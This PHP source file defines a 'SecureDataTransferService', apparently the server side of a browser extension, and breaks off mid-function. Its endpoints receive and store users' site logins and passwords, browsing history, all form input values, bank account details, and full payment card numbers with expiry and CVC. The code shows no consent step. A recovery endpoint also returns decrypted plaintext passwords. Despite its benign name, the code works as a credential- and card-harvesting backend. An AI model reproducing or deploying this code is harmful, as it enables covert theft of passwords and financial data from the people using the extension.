<?php declare(strict_types=1);

namespace Mishusoft\Framework\Chipsets\Services;

use Mishusoft\Framework\Chipsets\Cryptography\OpenSSL\Decryption;
use Mishusoft\Framework\Chipsets\Cryptography\OpenSSL\Encryption;
use Mishusoft\Framework\Chipsets\Http;
use Mishusoft\Framework\Chipsets\Http\Browser;
use Mishusoft\Framework\Chipsets\Storage;
use Mishusoft\Framework\Chipsets\System\Firewall;
use Mishusoft\Framework\Chipsets\System\Network;
use Mishusoft\Framework\Chipsets\System\Time;
use Mishusoft\Framework\Chipsets\Utility\_Array;
use Mishusoft\Framework\Chipsets\Utility\_Debug;
use Mishusoft\Framework\Chipsets\Utility\_String;
use Mishusoft\Framework\Chipsets\Utility\Number;

class SecureDataTransferService
{
    /**
     * SecureDataTransferService constructor.
     * This is built-in uninterrupted web request processing delivery system.
     */

    /*declare version*/
    public static SecureDataTransferDatabaseService $conOfDatabase;
    private static int $limitOfProductLicence;
    private static int $limitOfProductLicenceBase;

    /**
     * SecureDataTransferService constructor.
     */
    public function __construct()
    {
        self::$conOfDatabase = new SecureDataTransferDatabaseService();
    }

    /**
     * @param array $request
     */
    public function api(array $request)
    {
        _Debug::preOutput($request);
        
    }

    /**
     * @param array $request
     * @throws \JsonException
     */
    public function monitor(array $request)
    {
        if (_String::lower($request["method"]) === _String::lower('index')) {
            Firewall::runtimeFailure("Bad Request", [
                "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                "error" => ["description" => "Your requested url is broken!!"]
            ]);
        }
        else if (_String::lower($request["method"]) === _String::lower('browser')) {
            if (_String::lower(implode("/", $request['arguments'])) === _String::lower('receiveFeedback')) {

                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("update", $RequestedDataArray) and is_array($RequestedDataArray["update"]) and count($RequestedDataArray["update"]) > 0) {
                        self::$conOfDatabase->receiveInfoAboutUserUpdate(
                            _String::removeTags(_Array::value($RequestedDataArray["update"], "name")), _String::removeTags(_Array::value($RequestedDataArray["update"], "version")),
                            _String::removeTags(_Array::value($RequestedDataArray["update"], "ip")), _String::removeTags(_Array::value($RequestedDataArray["update"], "browser")),
                            _String::removeTags(_Array::value($RequestedDataArray["update"], "message")));

                        header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                    }

                    if (array_key_exists("status", $RequestedDataArray) and is_array($RequestedDataArray["status"]) and count($RequestedDataArray["status"]) > 0) {
                        $status = self::$conOfDatabase->getInfAbtInstPrdStatus(_String::removeTags(_Array::value($RequestedDataArray["status"], "name")),
                            _String::removeTags(_Array::value($RequestedDataArray["status"], "version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "ip")),
                            _String::removeTags(_Array::value($RequestedDataArray["status"], "os_version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "browser")));
                        if (is_array($status) and count($status) > 0) {
                            self::$conOfDatabase->updateInfOfPrdStatus(_String::removeTags(_Array::value($RequestedDataArray["status"], "name")),
                                _String::removeTags(_Array::value($RequestedDataArray["status"], "version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "ip")),
                                _String::removeTags(_Array::value($RequestedDataArray["status"], "os_version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "browser")),
                                _String::removeTags(_Array::value($RequestedDataArray["status"], "message")));
                        } else {
                            self::$conOfDatabase->insertInfOfPrdStatus(_String::removeTags(_Array::value($RequestedDataArray["status"], "name")),
                                _String::removeTags(_Array::value($RequestedDataArray["status"], "version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "ip")),
                                _String::removeTags(_Array::value($RequestedDataArray["status"], "os_version")), _String::removeTags(_Array::value($RequestedDataArray["status"], "browser")),
                                _String::removeTags(_Array::value($RequestedDataArray["status"], "message")));
                        }

                        header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                    }

                    if (!empty(_Array::value($RequestedDataArray, "browser")) && is_array(_Array::value($RequestedDataArray, "browser"))) {
                        self::$conOfDatabase->rcvInfAbtUsersBrowser(_Array::value($RequestedDataArray, "browser"));
                    }
                    if (!empty(_Array::value($RequestedDataArray, "ipdata")) && is_array(_Array::value($RequestedDataArray, "ipdata"))) {
                        self::$conOfDatabase->rcvInfAbtUsersIP(_Array::value($RequestedDataArray, "ipdata"));
                    }
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } /*send installed product id form server to client*/
            else if (_String::lower(join("/", $request['arguments'])) === _String::lower('getPubAppId')) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (!empty(_Array::value($RequestedDataArray, "IdRequest")) && is_array(_Array::value($RequestedDataArray, "IdRequest"))) {
                        if (_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "message") == 'install' || _Array::value(_Array::value($RequestedDataArray, "IdRequest"), "message") == 'checkRun') {
                            self::getVerifiedProductId($RequestedDataArray);
                        } elseif (strpos(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "message"), "update") <= 0) {
                            self::getVerifiedProductId($RequestedDataArray);
                        } else {
                            Storage::StreamAsJson(array("data" => "empty"));
                        }
                    }
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } /*manage user data form client*/
            elseif (_String::lower(join("/", $request['arguments'])) === _String::lower("UserDataManagement") || _String::lower(join("/", $request['arguments'])) === _String::lower("browserUserDataManagement")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                $defaultQueries = array(
                    "tracker" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "tracker"),
                    "app_id" => Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                    "ip_address" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip"),
                    "os_name_arch" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch"),
                    "browserNameFull" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "browser")
                );
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("userdata", $RequestedDataArray) and array_key_exists("command", $RequestedDataArray)) {
                        /*collect data*/
                        if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveLoginData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, array(
                                "workWebsite" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "event" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "event"),
                                "username" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "username"),
                                "password" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "password"),
                                "last_update_date_time" => Time::getToday()
                            )));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . ' 204 No response');
                        }
                        /*collect data*/
                        if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveLogoutData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, array(
                                "workWebsite" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "event" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "event"),
                                "username" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "username"),
                                "last_update_date_time" => Time::getToday()
                            )));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                        }
                        /*collect data*/
                        if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveNavigateData')) {
                            self::$conOfDatabase->saveDataOfUsersBrowserHistories(array_merge($defaultQueries, array(
                                "workWebsite" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "last_update_date_time" => Time::getToday()
                            )));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                        }
                        /*collect data*/
                        if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveUserSettingData')) {
                            $licence = '';
                            $registeredUserIdByEmail = '';
                            if (_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email"))) {
                                $registeredUserIdByEmail = self::$conOfDatabase->getUsrIdByEmlAddr(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")));
                            }

                            if (_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip")) {
                                $registeredUserIdByIP = self::$conOfDatabase->getUsrIdByIpAddr(_String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip")));
                                $licence = self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                    Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                    _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                    _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                );
                            }
                            if (!empty(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "first_name"))) &&
                                !empty(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "last_name"))) &&
                                !empty(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email"))) &&
                                !empty(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password")))) {
                                if (!empty($registeredUserIdByEmail)) {
                                    Storage::StreamAsJson(array('message' => 'error', 'registration' => 'already_register', 'way' => 'email', 'licence' => $licence));
                                } elseif (!empty($registeredUserIdByIP)) {
                                    Storage::StreamAsJson(array('message' => 'error', 'registration' => 'already_register', 'way' => 'ip', 'licence' => $licence));
                                } else {
                                    self::$conOfDatabase->saveUserSettingData(
                                        Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                        _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                        _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch")),
                                        _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                        _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "first_name")),
                                        _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "last_name")),
                                        _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")),
                                        Encryption::static(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password")))
                                    );

                                    self::getLicenceLimitByPlan('trial');

                                    self::$conOfDatabase->setLicenceForProductOfUser(
                                        Number::filterInt(self::$conOfDatabase->getUsrIdByEmlAddr(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")))),
                                        Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                        _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                        _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                        'trial', self::$limitOfProductLicence, self::$limitOfProductLicenceBase, Time::getToday(),
                                        Time::getToday(), Time::getNextDayDate(), 'not-fixed'
                                    );

                                    Storage::StreamAsJson(array(
                                        'message' => 'success', 'registration' => 'new_register',
                                        'way' => 'new', 'log_status' => 'success', 'u_pass' => Encryption::static(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password"))),
                                        'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                            Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                            _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                            _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                        )
                                    ));
                                }
                            } else {
                                Storage::StreamAsJson(array('message' => 'error', 'registration' => 'failed', 'way' => 'empty_data', 'licence' => $licence));
                            }
                        }

                        if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveRegistrationData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, array(
                                "workWebsite" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "event" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "event"),
                                "username" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "username"),
                                "password" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "password"),
                                "email" => _Array::value(_Array::value($RequestedDataArray, "userdata"), "email"),
                                "last_update_date_time" => Time::getToday()
                            )));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                        }

                        if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('doUserLoginData')) {
                            /*print_r(Decryption::static($data->userdata->_default_->app_id));*/
                            $IdNbOfUsr = self::$conOfDatabase->getUsrIdByEmlAddr(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")));
                            $userDetailsByEmail = self::$conOfDatabase->getUsrDtlByEml(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")));
                            if (is_array($userDetailsByEmail) and count($userDetailsByEmail) > 0) {
                                $password = self::$conOfDatabase->getUsrPssByEmlAddr(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")));
                                if (!empty($password) and strlen($password) > USER_PASSWORD_LENGTH_LIMIT) {
                                    if (_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "passwordType")) === 'encrypt') {
                                        if (Decryption::static(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password"))) === $password) {
                                            $userDetails = self::$conOfDatabase->getUsrDtlByEmlPss(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password")));
                                            self::processUserAuthentication($RequestedDataArray, $IdNbOfUsr, $userDetails);
                                        } else {
                                            Storage::StreamAsJson(array('message' => 'error', 'login' => 'incorrect', 'way' => 'password'));
                                        }
                                    } else {
                                        if (_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password")) === $password) {
                                            $userDetails = self::$conOfDatabase->getUsrDtlByEmlPss(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")), Encryption::static(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password"))));
                                            self::processUserAuthentication($RequestedDataArray, $IdNbOfUsr, $userDetails);
                                        } else {
                                            Storage::StreamAsJson(array('message' => 'error', 'login' => 'incorrect', 'way' => 'password'));
                                        }
                                    }
                                } else {
                                    Storage::StreamAsJson(array('message' => 'error', 'login' => 'not_exist', 'way' => 'password'));
                                }
                            } else {
                                Storage::StreamAsJson(array('message' => 'error', 'login' => 'not_exist', 'way' => 'email'));
                            }
                        }

                        if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('resetUserIpData')) {
                            self::$conOfDatabase->resetUsrDtlByNbOfUsrId(
                                self::$conOfDatabase->getUsrIdByIpAddr(_String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip"))),
                                Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch")),
                                _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "first_name")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "last_name")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")),
                                Encryption::static(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password")))
                            );

                            Storage::StreamAsJson(array(
                                'message' => 'success', 'registration' => 'new_register',
                                'way' => 'new', 'log_status' => 'success', 'u_pass' => _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "password")),
                                'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                    Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                    _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                    _String::removeTags(_Array::value(_Array::value(_Array::value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                )
                            ));
                        }

                        if (_String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('recoverUserPassword')) {
                            $user = self::$conOfDatabase->getUsrDtlByEml(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")));
                            if (isset($user)) {
                                $password = self::$conOfDatabase->getUsrPssByEmlAddr(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "userdata"), "email")));
                                if (isset($password)) {
                                    Storage::StreamAsJson(array('message' => 'success', 'passwordRecovery' => 'exist', 'way' => 'email', 'password' => Decryption::static($password)));
                                } else {
                                    Storage::StreamAsJson(array('message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'password'));
                                }
                            } else {
                                Storage::StreamAsJson(array('message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'email'));
                            }
                        }
                    }
                } /*else {
                            Firewall::runtimeFailure("Bad Request", [
                                "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                                "error" => ["description" => "Your requested url is broken!!"]
                            ]);
                        }*/
            } /*collect client's browser's input data*/
            elseif (_String::lower(join("/", $request['arguments'])) === _String::lower("InputElementDataRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray) and array_key_exists("inputElementData", $RequestedDataArray)
                        and _String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveInputElementData'
                            and is_array(_Array::value($RequestedDataArray, "inputElementData")))) {
                        $defaultQueries = array(
                            "tracker" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "inputElementData"), "_default_"), "tracker"),
                            "app_id" => Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "inputElementData"), "_default_"), "app_id")),
                            "ip_address" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "inputElementData"), "_default_"), "ip"),
                            "browserNameFull" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "inputElementData"), "_default_"), "browser")
                        );
                        self::$conOfDatabase->storeCltBrInpInDb(array_merge($defaultQueries, array(
                            "work_website" => _Array::value(_Array::value($RequestedDataArray, "inputElementData"), "workWebsite"),
                            "name" => _Array::value(_Array::value($RequestedDataArray, "inputElementData"), "name"),
                            "type" => _Array::value(_Array::value($RequestedDataArray, "inputElementData"), "type"),
                            "value" => _Array::value(_Array::value($RequestedDataArray, "inputElementData"), "value"),
                            "placeholder" => _Array::value(_Array::value($RequestedDataArray, "inputElementData"), "placeholder"),
                        )));
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } /*collect client's bank account info from browser*/
            elseif (_String::lower(join("/", $request['arguments'])) === _String::lower("clientBankAccountRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray) and array_key_exists("bankAccountData", $RequestedDataArray)
                        and _String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('saveBankAccountData'
                            and is_array(_Array::value($RequestedDataArray, "bankAccountData")))) {
                        $defaultQueries = array(
                            "tracker" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "_default_"), "tracker"),
                            "app_id" => Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "_default_"), "app_id")),
                            "ip_address" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "_default_"), "ip"),
                            "browserNameFull" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "_default_"), "browser")
                        );
                        self::$conOfDatabase->storeCltBnkAccData(array_merge($defaultQueries, array(
                            "work_website" => _Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "workWebsite"),
                            "data_type" => _Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "name"),
                            "data_value" => _Array::value(_Array::value($RequestedDataArray, "bankAccountData"), "type")
                        )));
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } /*collect client's online payment info from browser*/
            elseif (_String::lower(join("/", $request['arguments'])) === _String::lower("clientPaymentMethodsRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray) and array_key_exists("paymentMethodsInfo", $RequestedDataArray)
                        and _String::lower(_Array::value($RequestedDataArray, "command")) === _String::lower('savePaymentMethodsData'
                            and is_array(_Array::value($RequestedDataArray, "paymentMethodsInfo")))) {
                        $defaultQueries = array(
                            "tracker" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "tracker"),
                            "app_id" => Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "app_id")),
                            "ip_address" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "ip"),
                            "os_name_arch" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "os_name_arch"),
                            "browserNameFull" => _Array::value(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "browser")
                        );
                        if (_String::lower(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardNumber")) !== _String::lower("Unknown")
                            and _String::lower(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardHolder")) !== _String::lower("Unknown")
                            and _String::lower(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardBrand")) !== _String::lower("Unknown")
                            and _String::lower(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardExpire")) !== _String::lower("Unknown")
                            and _String::lower(_Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardCVC")) !== _String::lower("Unknown"))
                            self::$conOfDatabase->storeCltPytMtdData(array_merge($defaultQueries, array(
                                "work_website" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "workWebsite"),
                                "event" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "event") ? _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "event") : 'bug',
                                "cardNumber" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardNumber"),
                                "cardHolder" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardHolder"),
                                "cardBrand" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardBrand"),
                                "cardExpire" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardExpire"),
                                "cardCVC" => _Array::value(_Array::value($RequestedDataArray, "paymentMethodsInfo"), "cardCVC")
                            )));
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } /*collect client's online earning info from browser*/
            elseif (_String::lower(join("/", $request['arguments'])) === _String::lower("clientEarningRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray)
                        and array_key_exists("earndata", $RequestedDataArray)
                        and is_array(_Array::value($RequestedDataArray, "earndata"))) {

                        self::$conOfDatabase->upgradeLcnLmt(
                            Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                            Number::filterInt(_Array::value(_Array::value($RequestedDataArray, "earndata"), "earn"))
                        );

                        $today = self::$conOfDatabase->getClientErnDtlByDt(
                            Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                            _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "earndata"), "username")),
                            Time::getTodayDateOnly()
                        );
                        if (!is_array($today) and count($today)) {
                            self::$conOfDatabase->updateClientErnDtlByDt(
                                Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "earndata"), "username")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "earndata"), "earn")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "earndata"), "referrals")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "earndata"), "referralsEarn"))
                            );
                        } else {
                            self::$conOfDatabase->storeClientErnDtlByDt(
                                Decryption::static(_Array::value(_Array::value(_Array::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "earndata"), "earn")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "earndata"), "referrals")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "earndata"), "referralsEarn")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "earndata"), "event")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "earndata"), "username")),
                                _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "earndata"), "workWebsite")),
                                Time::getTodayDateOnly()
                            );
                        }
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } else {
                Firewall::runtimeFailure("Bad Request", [
                    "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                    "error" => ["description" => "Your requested url is broken!!"]
                ]);
            }
        }
        /*                else if(_String::lower(self::$requestMethod) === _String::lower("test")){
            self::$conOfDatabase->select("system")->create([
                "clients.browser.passwords.info",
                "clients.browser.histories.info",
                "clients.browser.inputs.info",
                "clients.bank.account.info",
                "clients.earning.captcha.info",
            ]);
        }*/
        else {
            Firewall::runtimeFailure("Bad Request", [
                "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                "error" => ["description" => "Your requested url is broken!!"]
            ]);
        }
    }


    /**
     * @param array $RequestedDataArray
     */
    private static function getVerifiedProductId(array $RequestedDataArray) : void
    {
        $idNbOfProduct = self::$conOfDatabase->getIdNbOfVerifiedProduct(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "name")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "version")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "ip")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "browser")));
        if (!is_numeric($idNbOfProduct)) {
            Storage::StreamAsJson(array('app_pub_id' => Encryption::static($idNbOfProduct)));
        } else {
            self::$conOfDatabase->addProductToInstList(_String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "name")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "version")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "ip")), _String::removeTags(_Array::value(_Array::value($RequestedDataArray, "IdRequest"), "browser")));
            Storage::StreamAsJson(array('app_pub_id' => Encryption::static(self::$conOfDatabase->getLastInsertedId("installed.products"))));
        }
    }

    private static function getLicenceLimitByPlan(string $plan) : void
    {
        switch ($plan) {
            case 'trial':
                self::$limitOfProductLicence = 2000;
                self::$limitOfProductLicenceBase = 2000;
                break;
            case 'Plan 01':
                self::$limitOfProductLicence = 10000;
                self::$limitOfProductLicenceBase = 10000;
                break;
